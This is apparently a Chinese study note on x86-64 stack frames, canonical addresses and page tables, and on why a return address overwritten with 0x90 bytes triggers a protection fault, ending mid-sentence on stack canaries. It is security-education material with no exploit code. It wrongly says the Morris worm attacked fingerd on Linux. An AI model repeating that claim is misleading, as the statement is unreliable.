内存分布的一些知识

每次代码编译成二进制文件都会被切分成几个部分，包括汇编指令的代码区，包含一些预设的const常量的静态区，以及可以动态管理的堆区与栈区。
但是程序是需要一块动态的连续区域来保存记录程序当前的运行状态，这里就是所谓的运行栈。按照我的理解，就是因为堆区选择了高自由度的随时分配与随时释放，所以把运行状态记录的责任交给了栈。
通常的，我们将每次调用的函数称为一个过程的活动(过程调用)。每次过程调用所用到的过程栈称为一个栈帧。其中一个栈帧的栈底的地址保存在帧指针寄存器里面，一个栈帧的栈顶的地址保存在栈指针寄存器里面。一个具体的栈帧的图片如下

如图所示，栈向低地址(0x00000000)方向“向下生长”(其中具有关于C语言的一些历史原因 bushi)。前面提到，每个活动(函数调用)都会创建一个独立的栈帧作为执行的“工作区”。它是连接调用者与被调用者的纽带，主要存储以下关键信息：

  • 一是函数的返回地址，由于栈帧相当于函数调用的草稿纸，但是这一块草稿纸与待执行的代码同样在内存上，所以这里面记录了CPU完成本次函数之后需要执行的下一条指令的内存地址，以方便CPU自动(注意这里无法手动操作)将其传入%rip/%eip
  • 二是保存的 调用此函数的对象的栈帧的指针 这是为了方便CPU完成本次函数的时候同步修改%rbp/%ebp值以回到上一题的草稿纸状态
  • 三是可能的函数参数，前面提到了：CPU中有6个整数寄存器可以用来传递前6个整数参数(或者字符串的地址等地址参数)，同理也有8个浮点参数寄存器(%XMM0−%XMM7)(\%XMM0-\%XMM7)(%XMM0−%XMM7)，那如果还有多余的参数没有参数寄存器使用的话，就会需要在新的栈帧上先将这些参数保存，然后通过%rbp的偏移去访问。
  • 四是一些声明的局部非堆变量(已经确定大小)

🔖 Canonical Address 机制

当 AMD 最早设计 x86-64 架构时，如果真的完整实现 64 位的虚拟地址寻址，意味着它可以寻址高达 16 EB（Exabytes，约 1600万 TB）的内存。
但在当时（乃至现在），没有任何系统需要这么大的内存。如果直接在 CPU 硬件里实现完整的 64 位寻址，会带来巨大的负担：

  • 页表查找开销（Page Table Walk）： 完整的 64 位寻址需要 6 级页表。页表级数越多，当 TLB（页表缓存）未命中时，CPU 遍历内存查找页表的次数就越多，性能损耗非常大。
  • 硬件成本： 支持更宽的地址线、更大的缓存和更复杂的 MMU（内存管理单元）会增加芯片面积和功耗。

因此，AMD 选择了一个折中方案：寄存器是 64 位的，但最初的硬件实现只使用低 48 位作为有效的虚拟地址。48 位可以提供 256 TB 的虚拟地址空间，这在过去和当前的一般应用中已经完全足够了。

1. 4 级页表结构（PML4）

在 Linux 和 Windows 系统中，传统的 x86-64 使用 4 级页表（4-level paging） 来管理内存。每级页表占用 9 位，加上 12 位的页内偏移（Page Size = 4KB）：

这就决定了通过 4 级页表能够映射的虚拟地址极限正好是 48 位。

2. Canonical Address（规范地址）规则的设计

为了给未来扩展留出余地（比如以后需要升级到 52 位或 64 位），并且不破坏当时编写的软件兼容性，x86-64 架构引入了 Canonical Address（规范地址） 的强制性规则：
虽然只用 48 位，但 CPU 在检查一个 64 位指针时，要求 第 48 位到第 63 位（高 16 位）必须是第 47 位（最高有效位）的符号扩展（完全复制）。
换句话说，高 16 位要么全是 0，要么全是 1：

  • 全 0（用户空间）： 从 0x0000000000000000\texttt{0x0000000000000000}0x0000000000000000 到 0x00007FFFFFFFFFFF\texttt{0x00007FFFFFFFFFFF}0x00007FFFFFFFFFFF（128 TB）。
  • 全 1（内核空间）： 从 0xFFFF800000000000\texttt{0xFFFF800000000000}0xFFFF800000000000 到 0xFFFFFFFFFFFFFFFF\texttt{0xFFFFFFFFFFFFFFFF}0xFFFFFFFFFFFFFFFF（128 TB）。

这中间巨大的空隙（从 0x00008000...\texttt{0x00008000...}0x00008000... 到 0xFFFF7FFF...\texttt{0xFFFF7FFF...}0xFFFF7FFF...）被称为非规范地址空间（Non-canonical address space）。

注：近几年的较新 CPU 如 Intel Ice Lake 或 AMD Zen 3 引入了 5 级页表，将虚拟地址扩展到了 57 位，但底层的 Canonical Address 规则依然适用，只是从 48 位扩展到了 57 位的符号扩展。

  • 在 x86-64 中，虽然寄存器是 64 位的，但当前 CPU 的虚拟地址空间实际只使用了 48 位(主机CPU ：AMD R7 4800U zen2 架构)。
  • CPU 要求所有内存地址必须是规范地址（Canonical），即地址的第 48 位到 63 位必须与第 47 位（符号位）完全一致（要么全 0，要么全 1）。
  • 0x9090909090909090 显然不符合这个规范规则。
    当 ret 指令试图将一个非规范地址（Non-canonical address）加载到 %rip 时，CPU 会直接拒绝执行跳转，并立即引发一个一般保护异常（General Protection Fault, #GP），这会被操作系统转换为 SIGSEGV 信号。

现代防护

栈溢出(或者说其大类——缓冲区溢出)具有着悠久的历史，最早的蠕虫病毒——Morris 蠕虫病毒就是利用了Linux系统上的一个名为 fingerd 的应用程序的栈溢出漏洞，其中也使用了这个没有安全长度检查的 gets() 函数。通过这种手段在没有通过口令认证的前提下劫持了目标主机，然后配合其他Hacker手段进一步传播。

专门针对栈溢出的防护就是上文中关闭的金丝雀值(Stack Canary)，其原理就是=编译器在函数栈帧中插入一个通过其他模块随机生成的金丝雀值，通常位于局部变量和返回地址之间。然后每次函数返回的时候，系统检查金丝雀值是否被修改。如果值发生变化，说明可能发生了缓冲区溢出，程序会立即终止运行。常见在Linux系统下就是输出
